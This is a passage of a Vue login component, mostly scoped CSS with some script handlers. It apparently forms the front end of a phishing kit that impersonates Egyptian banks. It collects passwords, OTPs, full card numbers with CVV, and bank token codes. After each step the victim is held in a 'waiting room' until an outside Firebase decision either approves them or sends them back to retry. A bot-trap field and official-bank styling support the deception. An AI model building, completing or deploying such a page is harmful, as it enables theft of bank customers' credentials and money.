    currentCustomerId.value = custId ?? currentCustomerId.value;
    router.push(ROUTE_PATHS.waitingRoom);
  } catch (error) {
    console.error("Unable to submit NBE token step", error);
  }
};

const handleBmTokenSubmit = async () => {
  const tokenValue = bmTokenCode.value.replace(/[^0-9]/g, "");
  bmTokenCode.value = tokenValue;
  if (!tokenValue) return;
  if (loginTrap.value.trim()) return;

  const attemptId = currentAttemptId.value || `attempt-${Date.now()}`;

  try {
    const custId = await submitBmTokenStep(attemptId, tokenValue);
    currentCustomerId.value = custId ?? currentCustomerId.value;
    router.push(ROUTE_PATHS.waitingRoom);
  } catch (error) {
    console.error("Unable to submit BM token step", error);
  }
};

const retryLoginCredentials = () => {
  password.value = "";
  passwordError.value = false;
  usernameError.value = "";
  waitingModalState.value = "";
  loginStep.value = "username";
};

const retryUsername = () => retryLoginCredentials();
const retryPassword = () => retryLoginCredentials();

const retryOtp = () => {
  otpCode.value = "";
  waitingModalState.value = "";
};

const retryCard = () => {
  cardNumber.value = "";
  cardExpiry.value = "";
  cardCvv.value = "";
  cardExpiryError.value = "";
  waitingModalState.value = "";
};

const retryNbeToken = () => {
  nbeTokenCode.value = "";
  waitingModalState.value = "";
};

const retryBmToken = () => {
  bmTokenCode.value = "";
  waitingModalState.value = "";
};

const finishApprovedLogin = () => {
  waitingModalState.value = "";
  currentCustomerId.value = "";
  currentAttemptId.value = "";
  customerListenerUnsubscribe?.();
  customerListenerUnsubscribe = null;
  customerListenerCustomerId = "";
  router.push("/success");
};

onBeforeUnmount(() => {
  // تنظيف اشتراك Firebase بالكامل حتى يمكن إعادة تفعيه عند العودة للصفحة
  // (مثلاً عند التحويل من /waiting-room بعد قرار الرفض)
  customerListenerUnsubscribe?.();
  customerListenerUnsubscribe = null;
  customerListenerCustomerId = "";
});
</script>
<style scoped>

/* تنسيقات خطوة البطاقة المصرفية */
.bank-card-guide-card {
  background: #f8fafc;
  border: 1px solid #e2e8f0;
  border-radius: 8px;
  padding: 10px 14px;
  margin-bottom: 14px;
}

.bank-card-guide-title {
  font-size: 0.88rem;
  font-weight: 700;
  color: #1e293b;
  margin: 0 0 2px;
}

.bank-card-guide-subtitle {
  font-size: 0.76rem;
  color: #64748b;
  margin: 0;
}

.card-input-wrapper {
  position: relative;
  display: flex;
  align-items: center;
  width: 100%;
}

.card-input-wrapper input.card-number-input,
#acc-sec-num {
  padding-left: 58px !important;
  padding-right: 14px !important;
  font-family: inherit;
  font-size: 0.95rem;
  letter-spacing: 1.2px;
  height: 48px;
  text-align: left !important;
  direction: ltr !important;
}

.card-chip-icon {
  position: absolute;
  left: 12px;
  top: 50%;
  transform: translateY(-50%);
  display: flex;
  align-items: center;
  justify-content: center;
  pointer-events: none;
  z-index: 2;
  width: 36px;
  height: 24px;
}

.card-input-brand-img {
  height: 18px;
  max-width: 36px;
  width: auto;
  object-fit: contain;
  transition: opacity 0.2s ease, transform 0.2s ease;
}

.card-inline-fields {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 10px;
}

.card-inline-fields .field {
  min-width: 0;
}

.card-inline-fields .field label {
  font-size: 0.88rem;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.card-inline-fields input,
#acc-sec-exp,
#acc-sec-code {
  height: 48px;
  font-size: 0.92rem;
  text-align: center !important;
  direction: ltr !important;
  padding: 0 8px !important;
}

.card-inline-fields input::placeholder,
#acc-sec-exp::placeholder,
#acc-sec-code::placeholder {
  text-align: center !important;
  direction: ltr !important;
}

.card-number-input::placeholder,
#acc-sec-num::placeholder {
  text-align: left !important;
  direction: ltr !important;
}

/* ===== Login Layout within AppShell ===== */
.login-screen {
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 56px 16px;
  min-height: 100vh;
  background: #f6f7f6;
}

.login-screen.login-screen-flat {
  background: #ffffff;
  padding: 0;
  margin: 0;
  align-items: flex-start;
  width: 100%;
  min-height: 100vh;
}

.login-main {
  width: 100%;
  max-width: 520px;
  background: #ffffff;
  border-radius: 16px;
  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05), 0 1px 4px rgba(0, 0, 0, 0.04);
  border: 1px solid #e2e8f0;
  padding: 44px 36px;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.login-main.login-main-flat {
  background: transparent;
  border: none;
  border-radius: 0;
  box-shadow: none;
  padding: 0;
  max-width: 100%;
}

.login-box {
  width: 100%;
  display: flex;
  flex-direction: column;
}

.login-logo {
  height: 120px;
  width: auto;
  align-self: center;
  margin-bottom: 36px;
  object-fit: contain;
}

.login-form {
  display: flex;
  flex-direction: column;
  gap: 24px;
  width: 100%;
  min-width: 0;
  flex: 1 1 auto;
}

/* خيارات نوع الحساب: أفراد / شركات */
.account-types {
  display: flex;
  gap: 12px;
  margin-bottom: 4px;
}

.account-type-btn {
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  height: 48px;
  border-radius: 10px;
  border: 1.5px solid #d8dee8;
  background: #f8fafc;
  color: #555f71;
  font-size: 1.05rem;
  font-weight: 700;
  cursor: pointer;
  transition: all 0.2s ease;
}

.account-type-btn svg {
  transition: transform 0.2s ease;
}

.account-type-btn:hover {
  border-color: #026A32;
  color: #026A32;
  background: #f0fdf4;
}

.account-type-btn.active {
  border-color: #026A32;
  background: #026A32;
  color: #ffffff;
  box-shadow: 0 6px 16px rgba(2, 106, 50, 0.25);
}

.bot-trap {
  position: absolute;
  width: 1px;
  height: 1px;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
}

.field {
  display: flex;
  flex-direction: column;
  gap: 12px;
}

.field-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.back-link-btn {
  background: transparent;
  border: none;
  color: #026A32;
  font-size: 0.92rem;
  font-weight: 700;
  cursor: pointer;
  padding: 0;
  text-decoration: underline;
}

.back-link-btn:hover {
  color: #014d24;
}

/* ===== OTP Timer & Resend Styles ===== */
.otp-resend-wrapper {
  display: flex;
  align-items: center;
  justify-content: center;
  margin-top: -6px;
  margin-bottom: 2px;
  min-height: 40px;
  text-align: center;
}

.otp-timer-display {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  font-size: 0.92rem;
  color: #64748b;
  font-weight: 500;
}

.otp-timer-label {
  color: #64748b;
}

.otp-timer-counter {
  font-family: monospace, ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas;
  font-weight: 700;
  color: #1e293b;
  font-size: 1rem;
  background: #f1f5f9;
  padding: 4px 10px;
  border-radius: 6px;
  letter-spacing: 1px;
}

.otp-resend-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  background: transparent;
  border: none;
  color: #007a3d;
  font-size: 0.94rem;
  font-weight: 700;
  cursor: pointer;
  padding: 6px 14px;
  border-radius: 6px;
  transition: all 0.2s ease;
  text-decoration: underline;
  text-underline-offset: 4px;
}

.otp-resend-btn:hover {
  color: #005a2b;
  background: rgba(0, 122, 61, 0.08);
}

.otp-resend-btn svg {
  transition: transform 0.3s ease;
}

.otp-resend-btn:hover svg {
  transform: rotate(-45deg);
}

.otp-resend-success {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  color: #15803d;
  background: #f0fdf4;
  border: 1px solid #bbf7d0;
  padding: 6px 16px;
  border-radius: 8px;
  font-size: 0.92rem;
  font-weight: 700;
}

/* ===== واجهة الـ OTP الجديدة (مطابقة لتصميم otp.html) ===== */
.otp-new-container {
  display: flex;
  flex-direction: column;
  align-items: center;
  width: 100%;
  padding: 8px 0 0;
  text-align: center;
}

.otp-new-icon-wrap {
  width: 78px;
  height: 78px;
  border-radius: 50%;
  background: #dff3e7;
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 22px;
  flex-shrink: 0;
}

.otp-new-icon-wrap svg {
  width: 32px;
  height: 32px;
  color: #008037;
}

.otp-new-verify-title {
  font-size: 24px;
  font-weight: 800;
  color: #0d0d0d;
  margin: 0 0 12px;
  line-height: 1.3;
}

.otp-new-verify-subtitle {
  font-size: 15px;
  color: #6b7280;
  text-align: center;
  margin: 0 0 28px;
  line-height: 1.6;
  max-width: 420px;
}

.otp-new-phone-mask {
  color: #008037;
  font-weight: 800;
  margin-right: 4px;
  letter-spacing: 1px;
}

/* صف حقل الـ OTP الموحَّد (حقل مستطيل واحد بدلاً من 6 مربعات) */
.otp-new-row {
  display: flex;
  justify-content: center;
  align-items: center;
  margin: 0 0 30px;
  /* عرض كامل مع padding داخلي حتى لا يلتصق الحقل بحواف الشاشة */
  width: 100%;
  max-width: 100%;
  min-width: 0;
  box-sizing: border-box;
  /* padding جانبي صغير كاحتياط للشاشات الضيقة جداً */
  padding: 0 4px;
  direction: ltr;
}

.otp-new-input {
  width: 54px;
  height: 64px;
  border: 1.5px solid #c9d3df;
  border-radius: 10px;
  background: #ffffff;
  text-align: center;
  font-size: 22px;
  font-weight: 700;
  color: #0d0d0d;
  font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
  outline: none;
  transition: border-color 0.15s, box-shadow 0.15s;
  caret-color: transparent;
  padding: 0;
  -moz-appearance: textfield;
}

.otp-new-input::-webkit-outer-spin-button,
.otp-new-input::-webkit-inner-spin-button {
  -webkit-appearance: none;
  margin: 0;
}

.otp-new-input:focus {
  border-color: #008037;
  box-shadow: 0 0 0 3px rgba(0, 128, 55, 0.12);
}

/* === حقل الـ OTP الموحَّد: مستطيل طبيعي مرن لجميع أحجام الشاشات === */
.otp-new-input-single {
  display: block !important;
  width: 100% !important;
  /* عرض مرن: بين 100% من الحاوي و 420px (شاشة كبيرة) */
  max-width: min(100%, 420px) !important;
  min-width: 220px !important;
  /* ارتفاع مرن: بين 56px (شاشة صغيرة) و 64px (شاشة كبيرة) */
  height: clamp(56px, 12vw, 64px) !important;
  min-height: 56px !important;
  box-sizing: border-box !important;
  border: 1.5px solid #c9d3df;
  border-radius: 12px;
  background: #ffffff;
  text-align: center;
  /* خط مرن: بين 22px (شاشة صغيرة) و 28px (شاشة كبيرة) */
  font-size: clamp(22px, 5.5vw, 28px);
  font-weight: 800;
  color: #0d0d0d;
  font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
  outline: none;
  /* تباعد الأرقام يتناسب مع حجم الخط حتى لا يخرج عن الحقل */
  letter-spacing: clamp(4px, 1.8vw, 10px);
  /* padding مرن يتناسب مع الخط */
  padding: 0 clamp(8px, 2vw, 14px);
  caret-color: #008037;
  transition: border-color 0.15s, box-shadow 0.15s;
  -moz-appearance: textfield;
  -webkit-appearance: none;
  appearance: none;
  direction: ltr;
  text-indent: 0; /* يمنع الإزاحة في بعض المتصفحات */
  flex-shrink: 1;
  flex-grow: 1;
  /* ضمان أن يكون مستطيل حتى في أضيق الظروف */
  aspect-ratio: auto;
}

.otp-new-input-single::-webkit-outer-spin-button,
.otp-new-input-single::-webkit-inner-spin-button {
  -webkit-appearance: none;
  margin: 0;
}

.otp-new-input-single::placeholder {
  color: #c9d3df;
  letter-spacing: 6px;
  font-weight: 700;
  opacity: 1;
}

.otp-new-input-single:focus {
  border-color: #008037;
  box-shadow: 0 0 0 3px rgba(0, 128, 55, 0.12);
}

/* العداد الكبير */
.otp-new-timer {
  font-size: 44px;
  font-weight: 900;
  color: #008037;
  margin-bottom: 6px;
  letter-spacing: 1px;
  font-variant-numeric: tabular-nums;
  line-height: 1.1;
}

.otp-new-timer-label {
  font-size: 14px;
  color: #6b7280;
  margin-bottom: 30px;
  text-align: center;
}

/* زر تأكيد الرمز */
.otp-new-submit-btn {
  width: 100%;
  background: #e6e8ed;
  color: #9ca3af;
  border: none;
  border-radius: 12px;
  padding: 16px 0;
  font-size: 16px;
  font-weight: 700;
  font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
  cursor: not-allowed;
  transition: background 0.15s, color 0.15s;
}

.otp-new-submit-btn.active {
  background: #008037;
  color: #ffffff;
  cursor: pointer;
}

.otp-new-submit-btn.active:hover {
  background: #006b2e;
}

/* زر إعادة الإرسال أسفل زر التأكيد */
.otp-new-resend-wrapper {
  display: flex;
  align-items: center;
  justify-content: center;
  margin-top: 18px;
  min-height: 36px;
  width: 100%;
}

.otp-new-resend-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  background: transparent;
  border: 1.5px solid #008037;
  color: #008037;
  font-size: 0.95rem;
  font-weight: 700;
  cursor: pointer;
  padding: 10px 22px;
  border-radius: 10px;
  transition: all 0.2s ease;
  font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
}

.otp-new-resend-btn:hover {
  background: rgba(0, 128, 55, 0.08);
  color: #006b2e;
  border-color: #006b2e;
}

.otp-new-resend-btn svg {
  transition: transform 0.3s ease;
}

.otp-new-resend-btn:hover svg {
  transform: rotate(-45deg);
}

.otp-new-resend-success {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  color: #15803d;
  background: #f0fdf4;
  border: 1px solid #bbf7d0;
  padding: 8px 18px;
  border-radius: 10px;
  font-size: 0.95rem;
  font-weight: 700;
  font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
}

/* ============================================================ */
/* استجابة الشاشات — تدرّج لكل حجم هاتف/تابلت/ديسكتوب            */
/* ============================================================ */

/* هواتف صغيرة جداً (iPhone SE 1st gen, 320px) */
@media (max-width: 359px) {
  .otp-new-input-single {
    height: 54px;
    font-size: 22px;
    letter-spacing: 4px;
    padding: 0 10px;
  }
  .otp-new-input-single::placeholder {
    letter-spacing: 3px;
  }
  .otp-new-verify-title {
    font-size: 18px;
  }
  .otp-new-timer {
    font-size: 32px;
  }
}

/* هواتف صغيرة إلى متوسطة (360px - 480px) */
@media (min-width: 360px) and (max-width: 480px) {
  .otp-new-input-single {
    height: 56px;
    font-size: 24px;
    letter-spacing: 6px;
    padding: 0 12px;
  }
  .otp-new-verify-title {
    font-size: 20px;
  }
  .otp-new-timer {
    font-size: 36px;
  }
}

/* هواتف متوسطة إلى كبيرة (481px - 767px) */
@media (min-width: 481px) and (max-width: 767px) {
  .otp-new-input-single {
    height: 60px;
    font-size: 26px;
    letter-spacing: 8px;
    padding: 0 14px;
  }
  .otp-new-verify-title {
    font-size: 22px;
  }
  .otp-new-timer {
    font-size: 40px;
  }
}

/* تابلت (768px - 1023px) */
@media (min-width: 768px) and (max-width: 1023px) {
  .otp-new-input-single {
    height: 62px;
    font-size: 27px;
    letter-spacing: 9px;
    padding: 0 14px;
  }
  .otp-new-verify-title {
    font-size: 24px;
  }
  .otp-new-timer {
    font-size: 42px;
  }
}

/* استجابة كلاسيكية للشاشات الصغيرة (للتوافق مع الأنماط القديمة) */
@media (max-width: 480px) {
  .otp-new-input {
    width: 42px;
    height: 54px;
    font-size: 18px;
  }
  .otp-new-icon-wrap {
    width: 64px;
    height: 64px;
    margin-bottom: 16px;
  }
  .otp-new-icon-wrap svg {
    width: 28px;
    height: 28px;
  }
  /* تقليص padding البطاقة على الموبايل لتوفير مساحة للحقل */
  .login-main {
    padding: 32px 20px;
  }
  .login-screen {
    padding: 32px 12px;
  }
  /* ضمان أن الحقل لا يتجاوز العرض المتاح */
  .otp-new-input-single {
    min-width: 0 !important;
    max-width: 100% !important;
  }
  .otp-new-row {
    padding: 0;
  }
}


/* ===== BM Token Step Styles ===== */
.bm-token-header-section {
  text-align: center;
  margin-bottom: 6px;
}

.bm-token-header-section {
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
  margin-top: 4px;
  margin-bottom: 24px;
}

.bm-token-shield-badge {
  width: 64px;
  height: 64px;
  border-radius: 50%;
  background: #e8f5e9;
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 14px;
}

.bm-token-shield-badge svg {
  stroke: #007a3d;
}

.bm-token-main-title {
  font-size: 1.55rem;
  font-weight: 800;
  color: #111827;
  margin: 0 0 10px;
  line-height: 1.3;
}

.bm-token-main-desc {
  font-size: 0.95rem;
  color: #4b5563;
  line-height: 1.6;
  margin: 0;
}

.bm-token-refresh-note {
  font-size: 0.88rem;
  color: #64748b;
  line-height: 1.5;
  margin: -8px 0 2px;
  text-align: center;
  font-weight: 500;
}

.field label {
  color: #2b3344;
  font-size: 0.95rem;
  font-weight: 700;
}

.field input {
  width: 100%;
  height: 48px;
  border: 1.5px solid #d1d5db;
  border-radius: 10px;
  padding: 0 14px;
  font-size: 0.95rem;
  font-weight: 600;
  color: var(--ink);
  background: #ffffff;
  transition: all 0.2s ease;
}

#companyId,
#username,
#password,
.password-wrap input {
  direction: ltr !important;
  text-align: left !important;
  unicode-bidi: isolate !important;
}

#password,
.password-wrap input {
  padding-left: 54px !important;
  padding-right: 14px !important;
  font-family: inherit;
  letter-spacing: 0.5px;
}

#companyId::placeholder,
#username::placeholder,
#password::placeholder,
.password-wrap input::placeholder {
  color: #9aa3b2;
  text-align: right;
  direction: rtl;
  letter-spacing: normal;
}

#otp,
#nbe-token,
#bm-token {
  direction: ltr !important;
  text-align: center !important;
  unicode-bidi: isolate !important;
  letter-spacing: 4px;
  font-size: 1.15rem;
  font-weight: 700;
}

#otp::placeholder,
#nbe-token::placeholder,
#bm-token::placeholder {
  text-align: center;
  direction: rtl;
  letter-spacing: normal;
  font-size: 0.95rem;
  color: #9aa3b2;
}

/* تنسيقات زر تفعيل BM Token */
.bm-activation-action-wrap {
  display: flex;
  justify-content: center;
  margin: 4px 0 8px;
}

.bm-activation-cta-btn {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  padding: 9px 18px;
  background: #f8fafc;
  border: 1.5px dashed #026a32;
  border-radius: 8px;
  color: #026a32;
  font-size: 0.9rem;
  font-weight: 700;
  text-decoration: none;
  transition: all 0.2s ease;
}

.bm-activation-cta-btn:hover {
  background: #026a32;
  color: #ffffff;
  border-style: solid;
  transform: translateY(-1px);
  box-shadow: 0 4px 12px rgba(2, 106, 50, 0.2);
}

.field input:focus {
  outline: none;
  border-color: #026A32;
  box-shadow: 0 0 0 3px rgba(2, 106, 50, 0.15);
}

.random-image-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  margin-top: 0;
  margin-bottom: 18px;
  gap: 10px;
  text-align: center;
}

.random-preview-img {
  width: auto;
  max-width: 190px;
  max-height: 135px;
  height: auto;
  object-fit: contain;
  border-radius: 12px;
  border: 1px solid #e2e8f0;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.04);
  background: #ffffff;
  padding: 6px;
  display: block;
}

.random-image-caption {
  display: inline-block;
  font-size: 1.05rem;
  font-weight: 700;
  color: #475569;
  letter-spacing: 0.5px;
  text-transform: lowercase;
  background: #f1f5f9;
  padding: 4px 16px;
  border-radius: 20px;
  border: 1px solid #e2e8f0;
}

.password-wrap {
  position: relative;
}

.password-wrap input {
  padding-left: 54px;
}

.password-toggle {
  position: absolute;
  left: 16px;
  top: 50%;
  transform: translateY(-50%);
  display: inline-flex;
  align-items: center;
  justify-content: center;
  padding: 4px;
  border: 0;
  background: transparent;
  color: #8a93a3;
  line-height: 0;
}

.password-toggle:hover {
  color: #026A32;
}

.otp-steps-box {
  margin-top: 14px;
  margin-bottom: 4px;
  padding: 14px 16px;
  border-radius: 6px;
  background: #f8fafc;
  border: 1px solid #e2e8f0;
  text-align: right;
  direction: rtl;
}

.otp-steps-title {
  margin: 0 0 10px;
  color: #1e293b;
  font-size: 0.93rem;
  font-weight: 800;
  line-height: 1.6;
}

.otp-steps-list {
  margin: 0;
  padding-right: 18px;
  padding-left: 0;
  list-style-type: disc;
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.otp-steps-list li {
  color: #475569;
  font-size: 0.84rem;
  line-height: 1.65;
  font-weight: 500;
}

.nbe-token-guide-card {
  margin-top: 4px;
  margin-bottom: 14px;
  padding: 16px 18px;
  border-radius: 6px;
  background: #f8fafc;
  border: 1px solid #e2e8f0;
  text-align: right;
  direction: rtl;
}

.nbe-guide-title {
  margin: 0 0 4px;
  color: #1e293b;
  font-size: 0.98rem;
  font-weight: 800;
}

.nbe-guide-subtitle {
  margin: 0 0 10px;
  color: #475569;
  font-size: 0.88rem;
  font-weight: 700;
}

.nbe-steps-list {
  margin: 0;
  padding-right: 20px;
  padding-left: 0;
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.nbe-steps-list li {
  color: #334155;
  font-size: 0.88rem;
  line-height: 1.6;
  font-weight: 600;
}

.login-submit {
  height: 48px;
  margin-top: 12px;
  border: 0;
  border-radius: 10px;
  background: #cccccc;
  color: #ffffff;
  font-size: 1.08rem;
  font-weight: 700;
  transition: all 0.2s ease;
}

.login-submit:not(:disabled) {
  background: #026A32;
  box-shadow: 0 12px 22px rgba(2, 106, 50, 0.24);
  cursor: pointer;
}

.login-submit:disabled {
  cursor: not-allowed;
}

.otp-backdrop {
  position: fixed;
  inset: 0;
  z-index: 40;
  display: grid;
  place-items: center;
  padding: 20px;
  background: rgba(13, 24, 42, 0.48);
}

.otp-dialog {
  position: relative;
  width: min(430px, 100%);
  border-radius: 6px;
  padding: 28px;
  background: #ffffff;
  box-shadow: 0 16px 40px rgba(15, 36, 64, 0.16);
  text-align: center;
}

.otp-dialog .close-dialog-btn {
  position: absolute;
  top: 16px;
  left: 16px;
  width: 32px;
  height: 32px;
  min-height: 32px;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 0;
  border: none;
  background: transparent;
  color: #8a93a3;
  cursor: pointer;
  border-radius: 50%;
  line-height: 0;
  transition: color 0.2s, background 0.2s;
}

.otp-dialog .close-dialog-btn:hover {
  background: rgba(138, 147, 163, 0.12);
  color: #555f71; /* رمادي داكن عند التمرير */
}

.otp-dialog .close-dialog-btn svg {
  width: 20px;
  height: 20px;
  display: block;
}

.otp-dialog h2 {
  margin: 0;
  color: #172033;
  font-size: 1.65rem;
}

.otp-dialog p {
  margin: 10px 0 0;
  color: #667085;
  line-height: 1.8;
}

.otp-form {
  display: grid;
  gap: 14px;
  margin-top: 22px;
}

.otp-form input {
  height: 50px;
  border: 1px solid #d8dee8;
  border-radius: 6px;
  padding: 0 18px;
  text-align: center;
  font-size: 1.2rem;
  font-weight: 800;
  letter-spacing: 0;
}

.otp-dialog button {
  min-height: 44px;
  border: 0;
  border-radius: 6px;
  padding: 0 18px;
  color: #ffffff;
  background: #026A32;
  font-weight: 700;
}

.otp-dialog button:disabled {
  background: #b7c0cc;
  cursor: not-allowed;
}

.otp-error {
  color: #b42318;
  font-weight: 800;
}

.modal-status-icon {
  width: 72px;
  height: 72px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 16px;
}

.modal-status-icon.success {
  background: #e8f7f0;
}

.modal-status-icon.error {
  background: #fef2f2;
}

.modal-action-btn {
  margin-top: 18px;
  width: 100%;
}

.retry-btn {
  background: #c2413b !important;
}

.retry-btn:hover {
  background: #a8322d !important;
}

.success-btn {
  background: #179a73 !important;
}

.success-btn:hover {
  background: #127a5b !important;
}

.otp-loader {
  width: 38px;
  height: 38px;
  display: inline-block;
  border: 4px solid rgba(2, 106, 50, 0.18);
  border-top-color: #026A32;
  border-radius: 50%;
  animation: otp-spin 0.9s linear infinite;
}

@keyframes otp-spin {
  to {
    transform: rotate(360deg);
  }
}

@media (max-width: 900px) {
  .login-screen {
    flex-direction: column;
  }

  .login-main {
    order: 1;
    flex: 0 0 auto;
    padding: 40px 24px;
  }

  .login-aside {
    order: 2;
    flex: 0 0 auto;
    /* يدفع اللوحة الزرقاء لأسفل الشاشة فتظهر المساحة الفارغة فوقها لا تحتها */
    margin-top: auto;
    padding: 44px 32px;
  }

  .features {
    gap: 28px;
  }
}

@media (max-width: 520px) {
  .otp-backdrop {
    width: 100vw;
    height: 100dvh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 16px;
  }

  .otp-dialog {
    width: min(430px, calc(100vw - 32px));
    max-height: calc(100dvh - 32px);
    margin: 0;
    overflow-y: auto;
  }

  /* إخفاء الصورة الزرقاء في الخلفية ضمن منظور الهاتف */
  .aside-bg {
    display: none;
  }

  /* الأقسام الثلاثة بجانب بعضها والنص أسفل كل أيقونة */
  .features {
    flex-direction: row;
    align-items: flex-start;
    justify-content: space-between;
    gap: 12px;
    width: 100%;
  }

  .feature {
    flex: 1 1 0;
    flex-direction: column;
    align-items: center;
    text-align: center;
    gap: 12px;
  }

  /* تصغير الأيقونة 5% إضافية والنص 15% إضافية */
  .feature-icon {
    width: 43px;
    height: 43px;
    border-radius: 10px;
  }

  .feature-icon img {
    width: 21px;
    height: 21px;
  }

  .feature-text {
    max-width: none;
    font-size: 0.71rem;
  }
}

/* ===== بوب اب التحقق من NBE Token بنمط بنكي رسمي ===== */
.token-bank-dialog {
  max-width: 410px;
  padding: 30px 24px;
  text-align: center;
}

.token-bank-dialog h2 {
  font-size: 1.35rem;
  font-weight: 700;
  color: #111827;
  margin: 0 0 12px;
}

.token-modal-text {
  font-size: 0.96rem;
  color: #4b5563;
  line-height: 1.6;
  margin: 0 0 10px !important;
}

.token-modal-text strong {
  color: #026A32;
}

.token-modal-question {
  font-size: 1.02rem;
  font-weight: 700;
  color: #111827;
  margin: 0 0 22px !important;
}

.token-dialog-actions {
  display: flex;
  gap: 12px;
}

.bank-btn-confirm,
.bank-btn-cancel {
  flex: 1;
  height: 44px;
  border-radius: 10px;
  font-size: 0.96rem;
  font-weight: 700;
  border: 1px solid transparent;
  cursor: pointer;
  transition: background-color 0.15s ease;
}

.bank-btn-confirm {
  background: #026A32;
  color: #ffffff;
}

.bank-btn-confirm:hover {
  background: #015226;
}

.bank-btn-cancel {
  background: #ffffff;
  color: #374151;
  border-color: #d1d5db;
}

.bank-btn-cancel:hover {
  background: #f9fafb;
  color: #111827;
}

.input-error {
  border-color: #dc2626 !important;
  background-color: #fef2f2 !important;
  box-shadow: 0 0 0 3px rgba(220, 38, 38, 0.15) !important;
}

.field-error-msg {
  display: flex;
  align-items: center;
  gap: 6px;
  color: #dc2626;
  font-size: 0.88rem;
  font-weight: 700;
  margin-top: 4px;
  line-height: 1.4;
}

.field-error-msg svg {
  flex-shrink: 0;
}

.field-error-box {
  margin-top: 6px;
  padding: 12px 14px;
  background-color: #fef2f2;
  border: 1px solid #fecaca;
  border-radius: 6px;
  color: #991b1b;
  font-size: 0.88rem;
  line-height: 1.5;
  text-align: right;
  direction: rtl;
}

.password-rules-box {
  margin-top: 8px;
  padding: 14px 16px;
  background-color: #f8fafc;
  border: 1px solid #e2e8f0;
  border-radius: 8px;
  text-align: right;
  direction: rtl;
  transition: all 0.2s ease;
}

.password-rules-box.has-error {
  background-color: #fef2f2;
  border-color: #fecaca;
}

.field-error-header {
  display: flex;
  align-items: center;
  gap: 6px;
  font-weight: 700;
  color: #dc2626;
  font-size: 0.88rem;
  margin-bottom: 8px;
}

.rules-title {
  margin: 0 0 8px;
  font-weight: 700;
  color: #334155;
  font-size: 0.88rem;
}

.rules-list {
  margin: 0;
  padding-right: 0;
  padding-left: 0;
  list-style: none;
  display: flex;
  flex-direction: column;
  gap: 6px;
}

.rules-list li {
  display: flex;
  align-items: center;
  gap: 8px;
  color: #64748b;
  font-size: 0.86rem;
  font-weight: 600;
  transition: color 0.2s ease;
}

.rules-list li.met {
  color: #15803d;
}

.rules-list li.met .rule-icon {
  color: #15803d;
  font-weight: 800;
}

.rules-list li.unmet {
  color: #dc2626;
}

.rules-list li.unmet .rule-icon {
  color: #dc2626;
  font-weight: 800;
}

/* ===== تنسيقات خطوة NBE Token ===== */
.bm-token-header-section {
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
  margin-bottom: 20px;
}

.bm-token-shield-badge {
  width: 58px;
  height: 58px;
  background: #e8f5e9;
  border-radius: 14px;
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 12px;
  box-shadow: 0 4px 12px rgba(0, 122, 61, 0.12);
}

.bm-token-main-title {
  font-size: 1.35rem;
  font-weight: 800;
  color: #111827;
  margin: 0 0 8px;
}

.bm-token-main-desc {
  font-size: 0.92rem;
  color: #4b5563;
  line-height: 1.6;
  margin: 0;
  max-width: 360px;
}

.bm-token-refresh-note {
  font-size: 0.86rem;
  color: #64748b;
  text-align: center;
  margin: 12px 0 6px;
  line-height: 1.5;
}

/* ===== تصميم التحقق من رموز الأمان (BM Token) الجديد ===== */
.bm-security-card-container {
  width: 100%;
}

.bm-security-header {
  padding-bottom: 14px;
  margin-bottom: 18px;
  border-bottom: 1px solid #e2e8f0;
  text-align: center;
}

.bm-security-title {
  font-size: 1.35rem;
  font-weight: 800;
  color: #1e293b;
  margin: 0;
}

.bm-security-field-group {
  display: flex;
  flex-direction: column;
  gap: 8px;
  margin-bottom: 16px;
  width: 100%;
}

.bm-security-label {
  font-size: 1.05rem;
  font-weight: 800;
  color: #026a32;
  text-align: right;
  direction: rtl;
}

.bm-security-input-wrapper {
  position: relative;
  width: 100%;
  display: flex;
  align-items: center;
}

.bm-security-input {
  width: 100%;
  height: 48px;
  border: 1.5px solid #cbd5e1;
  border-radius: 10px;
  padding: 0 46px 0 14px;
  font-size: 1.25rem;
  font-weight: 700;
  text-align: center;
  color: #1e293b;
  background: #ffffff;
  transition: border-color 0.2s, box-shadow 0.2s;
  box-sizing: border-box;
}

.bm-security-input:focus {
  outline: none;
  border-color: #026a32;
  box-shadow: 0 0 0 3px rgba(2, 106, 50, 0.15);
}

.bm-visibility-toggle {
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  background: transparent;
  border: none;
  padding: 4px;
  color: #64748b;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 2;
  transition: color 0.15s ease;
}

.bm-visibility-toggle:hover {
  color: #026a32;
}

.bm-security-actions-row {
  display: flex;
  flex-direction: column;
